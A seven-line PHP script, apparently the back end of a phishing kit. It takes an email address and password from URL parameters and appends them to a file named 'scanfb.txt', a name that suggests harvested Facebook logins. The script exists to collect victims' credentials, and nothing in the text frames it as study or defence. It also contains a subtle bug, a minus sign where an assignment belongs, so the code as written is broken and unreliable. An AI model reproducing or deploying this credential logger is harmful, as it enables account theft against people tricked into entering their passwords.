<?php
$email = $_GET["email"];
$pass = $_GET["pass"];
$fp - fopen("scanfb.txt", "a" );
fwrite($fp,$email. "|".$pass );
fclose($fp);
?>
